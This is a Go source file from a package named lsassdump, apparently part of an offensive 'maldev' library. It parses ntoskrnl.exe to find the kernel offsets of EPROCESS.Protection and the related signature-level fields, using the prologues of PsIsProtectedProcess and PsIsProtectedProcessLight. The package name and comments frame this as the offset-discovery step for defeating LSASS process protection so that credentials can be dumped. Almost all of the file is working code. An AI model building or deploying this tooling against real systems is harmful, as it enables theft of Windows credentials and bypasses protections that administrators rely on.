package lsassdump

import (
	"debug/pe"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"os"
)

// Dynamic EPROCESS offset discovery.
//
// EPROCESS layout shifts every cumulative update — Microsoft never
// promises ABI stability. v0.x of this package required operators to
// hand-curate PPLOffsetTable per build, which doesn't scale.
//
// Inspired by wesmar/kvc (MIT) — the OffsetFinder there reads
// ntoskrnl.exe in user-mode and extracts the EPROCESS.Protection
// offset from the first instruction of `PsIsProtectedProcess` and
// `PsIsProtectedProcessLight`. Both kernel exports compile to a
// trivial wrapper:
//
//	PsIsProtectedProcess:
//	  movzx eax, byte ptr [rcx + EPROCESS.Protection_offset]
//	  test  eax, eax
//	  setnz al
//	  ret
//
// The first three bytes are always `0F B6 81` (movzx eax, byte ptr
// [rcx+disp32]) on x64; the next 4 bytes are the disp32 = the
// EPROCESS.Protection field offset. Extracting it requires no
// kernel-mode read — just parse ntoskrnl.exe as a PE on disk.
//
// kvc is MIT-licensed, so we cite it directly in source comments
// and reuse the technique. maldev stays MIT.
//
// SignatureLevel sits 2 bytes before Protection; SectionSignatureLevel
// sits 1 byte before. The PsIsProtectedProcess offset alone gives us
// all three.

// ErrProtectionOffsetNotFound fires when the parser couldn't locate
// the PsIsProtectedProcess export OR the function's prologue didn't
// match the expected `0F B6 81 disp32` pattern.
var ErrProtectionOffsetNotFound = errors.New("lsassdump: PsIsProtectedProcess prologue did not match the expected `movzx eax, [rcx+disp32]` pattern")

// DiscoverProtectionOffset reads ntoskrnl.exe at `path` and returns
// the EPROCESS.Protection byte offset.
//
// On Windows the canonical path is
// `%SystemRoot%\System32\ntoskrnl.exe`; pass an empty string to
// pick that up via os.Getenv("SystemRoot"). On Linux/CI you supply
// a captured ntoskrnl.exe explicitly (the parser is pure Go via
// debug/pe — no Windows runtime dependency).
//
// The returned offset cross-validates `PsIsProtectedProcess` and
// `PsIsProtectedProcessLight` — both exports MUST agree (they
// compile to identical wrappers around the same EPROCESS field).
// A mismatch surfaces as ErrProtectionOffsetNotFound to refuse
// shipping a wrong value.
func DiscoverProtectionOffset(path string) (uint32, error) {
	if path == "" {
		root := os.Getenv("SystemRoot")
		if root == "" {
			return 0, fmt.Errorf("DiscoverProtectionOffset: no path and SystemRoot unset")
		}
		path = root + `\System32\ntoskrnl.exe`
	}

	f, err := os.Open(path)
	if err != nil {
		return 0, fmt.Errorf("open %s: %w", path, err)
	}
	defer f.Close()

	pf, err := pe.NewFile(f)
	if err != nil {
		return 0, fmt.Errorf("parse %s: %w", path, err)
	}
	defer pf.Close()

	offA, err := extractProtectionOffset(f, pf, "PsIsProtectedProcess")
	if err != nil {
		return 0, fmt.Errorf("PsIsProtectedProcess: %w", err)
	}
	offB, err := extractProtectionOffset(f, pf, "PsIsProtectedProcessLight")
	if err != nil {
		return 0, fmt.Errorf("PsIsProtectedProcessLight: %w", err)
	}
	if offA != offB {
		return 0, fmt.Errorf("%w: PsIsProtectedProcess=%d != PsIsProtectedProcessLight=%d",
			ErrProtectionOffsetNotFound, offA, offB)
	}
	// Sanity bound — every documented build keeps the field under 0x1000.
	if offA == 0 || offA > 0x1500 {
		return 0, fmt.Errorf("%w: extracted offset 0x%X out of plausible range",
			ErrProtectionOffsetNotFound, offA)
	}
	return offA, nil
}

// SignatureLevelOffset returns EPROCESS.SignatureLevel given the
// EPROCESS.Protection offset. Per kvc's OffsetFinder, SignatureLevel
// always precedes Protection by 2 bytes. Stable Vista → 25H2.
func SignatureLevelOffset(protectionOff uint32) uint32 {
	return protectionOff - 2
}

// SectionSignatureLevelOffset returns EPROCESS.SectionSignatureLevel
// given the EPROCESS.Protection offset. Always precedes Protection
// by 1 byte.
func SectionSignatureLevelOffset(protectionOff uint32) uint32 {
	return protectionOff - 1
}

// extractProtectionOffset finds `name` in the PE's exports, reads
// the first 7 bytes of that function from .text, and returns the
// disp32 from a `movzx eax, byte ptr [rcx + disp32]` instruction.
func extractProtectionOffset(f io.ReaderAt, pf *pe.File, name string) (uint32, error) {
	rva, err := exportRVA(pf, name)
	if err != nil {
		return 0, err
	}

	// Map RVA → file offset via the section that contains it.
	sec := sectionForRVA(pf, rva)
	if sec == nil {
		return 0, fmt.Errorf("RVA 0x%X not in any section", rva)
	}
	fileOff := int64(sec.Offset) + int64(rva) - int64(sec.VirtualAddress)

	// Read the first 7 bytes of the function — `movzx eax, byte ptr
	// [rcx + disp32]` on x64 is `0F B6 81 d0 d1 d2 d3` (0x81 = ModR/M
	// for RAX with [RCX+disp32]).
	prologue := make([]byte, 7)
	if _, err := f.ReadAt(prologue, fileOff); err != nil {
		return 0, fmt.Errorf("read prologue @0x%X: %w", fileOff, err)
	}
	if prologue[0] != 0x0F || prologue[1] != 0xB6 || prologue[2] != 0x81 {
		return 0, fmt.Errorf("%w: prologue %02X %02X %02X (want 0F B6 81)",
			ErrProtectionOffsetNotFound, prologue[0], prologue[1], prologue[2])
	}
	return binary.LittleEndian.Uint32(prologue[3:7]), nil
}

// exportRVA looks up `name` in the PE's export directory and
// returns its RVA. debug/pe gives us a slice of exports — we walk
// it linearly because export tables are small (<10K entries on a
// typical kernel image).
func exportRVA(pf *pe.File, name string) (uint32, error) {
	// debug/pe doesn't expose export-directory walking directly
	// across versions; use the Symbols slice (covers exports +
	// internals on stripped binaries we don't have access to). For
	// proper export walking we parse the Export Directory ourselves.
	return findExportRVA(pf, name)
}

// findExportRVA parses the IMAGE_EXPORT_DIRECTORY by hand to locate
// `name`. debug/pe doesn't expose exported symbols directly on x64
// PE files; we walk the directory ourselves. Stable across every
// PE32+ kernel image we've seen.
func findExportRVA(pf *pe.File, name string) (uint32, error) {
	oh, ok := pf.OptionalHeader.(*pe.OptionalHeader64)
	if !ok {
		return 0, fmt.Errorf("not a PE32+ image (need x64 ntoskrnl)")
	}
	if len(oh.DataDirectory) < 1 {
		return 0, fmt.Errorf("no data directories")
	}
	exportDir := oh.DataDirectory[0]
	if exportDir.VirtualAddress == 0 || exportDir.Size == 0 {
		return 0, fmt.Errorf("export directory empty")
	}

	// Walk to find the section that holds the export directory.
	sec := sectionForRVA(pf, exportDir.VirtualAddress)
	if sec == nil {
		return 0, fmt.Errorf("export directory RVA 0x%X not in any section", exportDir.VirtualAddress)
	}
	secData, err := sec.Data()
	if err != nil {
		return 0, fmt.Errorf("read export section: %w", err)
	}

	// IMAGE_EXPORT_DIRECTORY layout (40 bytes):
	//   +0x00 Characteristics      uint32
	//   +0x04 TimeDateStamp        uint32
	//   +0x08 MajorVersion         uint16
	//   +0x0A MinorVersion         uint16
	//   +0x0C Name                 uint32
	//   +0x10 Base                 uint32
	//   +0x14 NumberOfFunctions    uint32
	//   +0x18 NumberOfNames        uint32
	//   +0x1C AddressOfFunctions   uint32
	//   +0x20 AddressOfNames       uint32
	//   +0x24 AddressOfNameOrdinals uint32
	dirStart := exportDir.VirtualAddress - sec.VirtualAddress
	if uint32(len(secData)) < dirStart+40 {
		return 0, fmt.Errorf("export directory truncated")
	}
	d := secData[dirStart : dirStart+40]
	numNames := binary.LittleEndian.Uint32(d[0x18:0x1C])
	addrFns := binary.LittleEndian.Uint32(d[0x1C:0x20])
	addrNames := binary.LittleEndian.Uint32(d[0x20:0x24])
	addrOrds := binary.LittleEndian.Uint32(d[0x24:0x28])

	// AddressOfFunctions: array of `NumberOfFunctions` × uint32 RVAs.
	// AddressOfNames: array of `NumberOfNames` × uint32 RVAs to ASCII strings.
	// AddressOfNameOrdinals: array of `NumberOfNames` × uint16 ordinal indexes.
	for i := uint32(0); i < numNames; i++ {
		nameRVA := readU32At(secData, sec.VirtualAddress, addrNames+i*4)
		ord := readU16At(secData, sec.VirtualAddress, addrOrds+i*2)
		fnRVA := readU32At(secData, sec.VirtualAddress, addrFns+uint32(ord)*4)

		exportName := readAsciizAt(secData, sec.VirtualAddress, nameRVA)
		if exportName == name {
			return fnRVA, nil
		}
	}
	return 0, fmt.Errorf("export %q not found", name)
}

// sectionForRVA returns the PE section whose virtual range covers
// the given RVA, or nil if no section matches. Callers handle nil
// — corrupt PEs or RVAs into sparse sections fall through cleanly.
func sectionForRVA(pf *pe.File, rva uint32) *pe.Section {
	for _, s := range pf.Sections {
		if rva >= s.VirtualAddress && rva < s.VirtualAddress+s.VirtualSize {
			return s
		}
	}
	return nil
}

// readU32At reads a uint32 from secData at the given absolute RVA,
// translating via secVA (the section's virtual address). Returns
// 0 on out-of-bounds.
func readU32At(secData []byte, secVA, rva uint32) uint32 {
	off := int64(rva) - int64(secVA)
	if off < 0 || off+4 > int64(len(secData)) {
		return 0
	}
	return binary.LittleEndian.Uint32(secData[off : off+4])
}

// readU16At reads a uint16 from secData at the given absolute RVA.
func readU16At(secData []byte, secVA, rva uint32) uint16 {
	off := int64(rva) - int64(secVA)
	if off < 0 || off+2 > int64(len(secData)) {
		return 0
	}
	return binary.LittleEndian.Uint16(secData[off : off+2])
}

// readAsciizAt reads a null-terminated ASCII string from secData
// at the given RVA. Caps at 256 bytes.
func readAsciizAt(secData []byte, secVA, rva uint32) string {
	off := int64(rva) - int64(secVA)
	if off < 0 || off >= int64(len(secData)) {
		return ""
	}
	end := off
	max := off + 256
	if max > int64(len(secData)) {
		max = int64(len(secData))
	}
	for end < max && secData[end] != 0 {
		end++
	}
	return string(secData[off:end])
}
